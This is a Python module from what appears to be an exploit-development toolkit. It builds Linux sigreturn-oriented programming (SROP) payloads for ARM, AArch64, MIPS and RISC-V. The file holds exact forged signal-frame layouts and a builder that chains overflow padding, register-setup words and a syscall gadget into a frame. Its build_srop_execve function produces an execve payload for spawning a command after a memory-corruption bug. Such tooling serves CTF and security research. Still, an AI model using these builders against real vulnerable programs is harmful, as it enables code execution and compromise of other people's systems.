"""Exact offline Linux sigreturn serializers for non-x86 ABIs.

The ARM, AArch64 and MIPS layouts mirror their Linux UAPI sigcontext
structures (and are byte-cross-checked against pwntools in the tests).  The
RISC-V layout is the complete RV64 ``rt_sigframe``: 128-byte siginfo,
ucontext, integer register state, floating-point/extension union, and aligned
terminator.  Nothing here executes or delivers the resulting bytes.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Iterable, Mapping, Sequence

try:
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
except ImportError:  # pragma: no cover
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes


MAX_OVERFLOW = 4 * 1024 * 1024
MAX_SETUP_WORDS = 256


@dataclass(frozen=True)
class SigreturnABI:
    name: str
    bits: int
    endian: str
    frame_size: int
    fields: Mapping[str, tuple[int, int]]
    defaults: Mapping[str, int]
    sigreturn_syscall: int
    execve_syscall: int
    syscall_register: str
    argument_registers: tuple[str, str, str]
    stack_register: str
    pc_register: str
    stack_alignment: int
    frame_kind: str


_ARM_FIELDS = {
    name: (offset, 4)
    for offset, name in {
        0: "uc_flags", 4: "uc_link", 8: "uc_stack.ss_sp",
        12: "uc_stack.ss_flags", 16: "uc_stack.ss_size", 20: "trap_no",
        24: "error_code", 28: "oldmask", 32: "r0", 36: "r1",
        40: "r2", 44: "r3", 48: "r4", 52: "r5", 56: "r6",
        60: "r7", 64: "r8", 68: "r9", 72: "r10", 76: "fp",
        80: "ip", 84: "sp", 88: "lr", 92: "pc", 96: "cpsr",
        100: "fault_address", 104: "uc_sigmask", 108: "unused",
        112: "uc_regspace", 232: "vfpu_magic", 236: "vfpu_size",
    }.items()
}

_AARCH64_FIELDS = {
    "fault_address": (304, 8),
    **{f"x{index}": (312 + index * 8, 8) for index in range(31)},
    "sp": (560, 8),
    "pc": (568, 8),
    "pstate": (576, 8),
    "fpsimd_header": (592, 8),
}

_MIPS_BE_OFFSETS = {
    0: "sf_ass0", 4: "sf_ass1", 8: "sf_ass2", 12: "sf_ass3", 16: "sf_ass4",
    20: "sf_pad0", 24: "sf_pad1", 28: "sc_regmask", 32: "sc_status",
    36: "pc", 44: "padding", 52: "at", 60: "v0", 68: "v1", 76: "a0",
    84: "a1", 92: "a2", 100: "a3", 108: "t0", 116: "t1",
    124: "t2", 132: "t3", 140: "t4", 148: "t5", 156: "t6",
    164: "t7", 172: "s0", 180: "s1", 188: "s2", 196: "s3",
    204: "s4", 212: "s5", 220: "s6", 228: "s7", 236: "t8",
    244: "t9", 252: "k0", 260: "k1", 268: "gp", 276: "sp",
    284: "s8", 292: "ra",
}

_MIPS_LE_OFFSETS = {
    0: "sf_ass0", 4: "sf_ass1", 8: "sf_ass2", 12: "sf_ass3", 16: "sf_ass4",
    20: "sc_regmask", 24: "sc_status", 32: "pc", 40: "padding", 48: "at",
    56: "v0", 64: "v1", 72: "a0", 80: "a1", 88: "a2", 96: "a3",
    104: "t0", 112: "t1", 120: "t2", 128: "t3", 136: "t4",
    144: "t5", 152: "t6", 160: "t7", 168: "s0", 176: "s1",
    184: "s2", 192: "s3", 200: "s4", 208: "s5", 216: "s6",
    224: "s7", 232: "t8", 240: "t9", 248: "k0", 256: "k1",
    264: "gp", 272: "sp", 280: "s8", 288: "ra",
}

# Complete RV64 rt_sigframe offsets.  Linux lays ``siginfo`` first (128
# bytes), then ucontext.  uc_mcontext begins at 296 and user_regs_struct is
# ordered exactly as arch/riscv/include/uapi/asm/ptrace.h.  ``sigcontext`` has
# 16-byte alignment because its largest FP-state union member is aligned(16),
# so uc_mcontext receives eight bytes of padding and begins at frame offset 304.
_RISCV_REGISTER_ORDER = (
    "pc", "ra", "sp", "gp", "tp", "t0", "t1", "t2", "s0", "s1",
    "a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7", "s2", "s3",
    "s4", "s5", "s6", "s7", "s8", "s9", "s10", "s11", "t3", "t4",
    "t5", "t6",
)
_RISCV_FIELDS = {
    "uc_flags": (128, 8), "uc_link": (136, 8),
    "uc_stack.ss_sp": (144, 8), "uc_stack.ss_flags": (152, 4),
    "uc_stack.ss_size": (160, 8),
    **{name: (304 + index * 8, 8) for index, name in enumerate(_RISCV_REGISTER_ORDER)},
    # The extension descriptor overlays the largest FP-state union.  A zero
    # magic/size pair is the required END header when no extensions are used.
    "extension_reserved": (1076, 4),
    "extension_magic": (1080, 4),
    "extension_size": (1084, 4),
}


ABIS: Mapping[str, SigreturnABI] = {
    "arm": SigreturnABI(
        "arm", 32, "little", 240, _ARM_FIELDS,
        {"trap_no": 6, "cpsr": 0x40000010, "vfpu_magic": 0x56465001,
         "vfpu_size": 0x120},
        119, 11, "r7", ("r0", "r1", "r2"), "sp", "pc", 8,
        "legacy-sigframe",
    ),
    "aarch64": SigreturnABI(
        "aarch64", 64, "little", 600, _AARCH64_FIELDS,
        {"fpsimd_header": 0x0000021046508001},
        139, 221, "x8", ("x0", "x1", "x2"), "sp", "pc", 16,
        "rt-sigframe",
    ),
    "mips": SigreturnABI(
        "mips", 32, "big", 296,
        {name: (offset, 4) for offset, name in _MIPS_BE_OFFSETS.items()}, {},
        4119, 4011, "v0", ("a0", "a1", "a2"), "sp", "pc", 8,
        "legacy-sigframe-o32",
    ),
    "mipsel": SigreturnABI(
        "mipsel", 32, "little", 292,
        {name: (offset, 4) for offset, name in _MIPS_LE_OFFSETS.items()}, {},
        4119, 4011, "v0", ("a0", "a1", "a2"), "sp", "pc", 8,
        "legacy-sigframe-o32",
    ),
    "riscv64": SigreturnABI(
        "riscv64", 64, "little", 1088, _RISCV_FIELDS,
        {"extension_reserved": 0, "extension_magic": 0, "extension_size": 0},
        139, 221, "a7", ("a0", "a1", "a2"), "sp", "pc", 16,
        "rt-sigframe",
    ),
}

_ALIASES = {"arm32": "arm", "arm64": "aarch64", "mipsbe": "mips",
            "mipsle": "mipsel", "rv64": "riscv64", "riscv": "riscv64"}


def sigreturn_abi(name: str) -> SigreturnABI:
    if not isinstance(name, str):
        raise BuildError("architecture must be text")
    normalized = _ALIASES.get(name.lower(), name.lower())
    try:
        return ABIS[normalized]
    except KeyError as exc:
        raise BuildError(f"unsupported sigreturn ABI: {name!r}") from exc


def _pack(spec: SigreturnABI, value: int, width: int, name: str) -> bytes:
    ensure_uint(value, width * 8, name=name)
    return value.to_bytes(width, spec.endian)


def _ensure_address_range(start: int, size: int, bits: int, *, name: str) -> None:
    """Reject a frame or payload region that wraps its ABI address space."""

    ensure_uint(start, bits, name=f"{name} start")
    if isinstance(size, bool) or not isinstance(size, int) or size < 0:
        raise BuildError(f"{name} size must be a non-negative integer")
    if size > (1 << bits) - start:
        raise BuildError(f"{name} exceeds the {bits}-bit address space")


def build_sigreturn_frame(
    architecture: str,
    registers: Mapping[str, int],
    *,
    frame_address: int = 0,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Serialize an exact non-x86 Linux sigreturn frame."""

    spec = sigreturn_abi(architecture)
    _ensure_address_range(frame_address, spec.frame_size, spec.bits, name="sigreturn frame")
    if frame_address % spec.stack_alignment:
        raise BuildError(
            f"frame_address must be {spec.stack_alignment}-byte aligned for {spec.name}"
        )
    if not isinstance(registers, Mapping):
        raise BuildError("registers must be a mapping")
    unknown = set(registers) - set(spec.fields)
    if unknown:
        raise BuildError(f"unknown {spec.name} frame fields: {', '.join(sorted(unknown))}")
    values = {**spec.defaults, **dict(registers)}
    stack = values.get(spec.stack_register, 0)
    if stack and stack % spec.stack_alignment:
        raise BuildError(
            f"{spec.stack_register} must be {spec.stack_alignment}-byte aligned for {spec.name}"
        )
    payload = bytearray(spec.frame_size)
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    for name, value in values.items():
        offset, width = spec.fields[name]
        payload[offset:offset + width] = _pack(spec, value, width, name)
        placements[f"frame.{name}"] = offset
        widths[f"frame.{name}"] = width
    raw = bytes(payload)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=spec.name,
        strategy="multiarch-linux-sigreturn-frame",
        base_address=frame_address,
        metadata={
            "frame_kind": spec.frame_kind,
            "sigreturn_syscall": str(spec.sigreturn_syscall),
            "source": "linux-uapi-layout",
        },
    )


def build_srop_trigger(
    architecture: str,
    registers: Mapping[str, int],
    *,
    setup_words: Sequence[int],
    sigreturn_number_index: int,
    syscall_gadget: int,
    overflow_offset: int = 0,
    fill: bytes = b"A",
    payload_address: int = 0,
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Prefix a frame with a caller-audited register-setup sequence.

    Gadget semantics differ radically across these ISAs, so the caller supplies
    every setup word and identifies which word establishes the sigreturn syscall
    number.  The builder verifies that value instead of pretending a universal
    pop gadget exists.
    """

    spec = sigreturn_abi(architecture)
    if (isinstance(overflow_offset, bool) or not isinstance(overflow_offset, int)
            or not 0 <= overflow_offset <= MAX_OVERFLOW):
        raise BuildError(f"overflow_offset must be in 0..{MAX_OVERFLOW}")
    if not isinstance(fill, bytes) or len(fill) != 1:
        raise BuildError("fill must be one byte")
    if isinstance(setup_words, (bytes, bytearray, str)) or not isinstance(setup_words, Sequence):
        raise BuildError("setup_words must be a non-string sequence")
    if not 1 <= len(setup_words) <= MAX_SETUP_WORDS:
        raise BuildError(f"setup_words must contain 1..{MAX_SETUP_WORDS} words")
    setup = tuple(setup_words)
    if (isinstance(sigreturn_number_index, bool) or not isinstance(sigreturn_number_index, int)
            or not 0 <= sigreturn_number_index < len(setup)):
        raise BuildError("sigreturn_number_index is outside setup_words")
    if setup[sigreturn_number_index] != spec.sigreturn_syscall:
        raise BuildError(
            f"setup word {sigreturn_number_index} must equal {spec.sigreturn_syscall}"
        )
    ensure_uint(payload_address, spec.bits, name="payload_address")
    ensure_uint(syscall_gadget, spec.bits, name="syscall_gadget")
    word = spec.bits // 8
    data = bytearray(fill * overflow_offset)
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    if overflow_offset:
        placements["padding"] = 0
        widths["padding"] = overflow_offset
    for index, value in enumerate(setup):
        placements[f"setup[{index}]"] = len(data)
        widths[f"setup[{index}]"] = word
        data += _pack(spec, value, word, f"setup[{index}]")
    placements["syscall_gadget"] = len(data)
    widths["syscall_gadget"] = word
    data += _pack(spec, syscall_gadget, word, "syscall_gadget")
    frame_address = payload_address + len(data)
    _ensure_address_range(
        payload_address, len(data) + spec.frame_size, spec.bits, name="SROP payload"
    )
    frame = build_sigreturn_frame(spec.name, registers, frame_address=frame_address)
    frame_offset = len(data)
    placements["sigreturn_frame"] = frame_offset
    widths["sigreturn_frame"] = len(frame.payload)
    data += frame.payload
    for name, offset in frame.placements.items():
        placements[name] = frame_offset + offset
        widths[name] = frame.widths[name]
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=spec.name,
        strategy="multiarch-srop-trigger",
        base_address=payload_address,
        metadata={
            "frame_kind": spec.frame_kind,
            "sigreturn_syscall": str(spec.sigreturn_syscall),
            "setup_contract": "caller-supplied words establish syscall number then enter gadget",
        },
    )


def build_srop_execve(
    architecture: str,
    *,
    command_address: int,
    stack_address: int,
    syscall_gadget: int,
    setup_words: Sequence[int],
    sigreturn_number_index: int,
    overflow_offset: int = 0,
    payload_address: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build a non-x86 SROP ``execve(command, NULL, NULL)`` payload."""

    spec = sigreturn_abi(architecture)
    args = spec.argument_registers
    registers = {
        spec.syscall_register: spec.execve_syscall,
        args[0]: command_address,
        args[1]: 0,
        args[2]: 0,
        spec.stack_register: stack_address,
        spec.pc_register: syscall_gadget,
    }
    result = build_srop_trigger(
        spec.name, registers,
        setup_words=setup_words,
        sigreturn_number_index=sigreturn_number_index,
        syscall_gadget=syscall_gadget,
        overflow_offset=overflow_offset,
        fill=fill,
        payload_address=payload_address,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="multiarch-srop-execve",
        base_address=result.base_address,
        metadata={**dict(result.metadata), "final_syscall": "execve",
                  "execve_number": str(spec.execve_syscall)},
    )

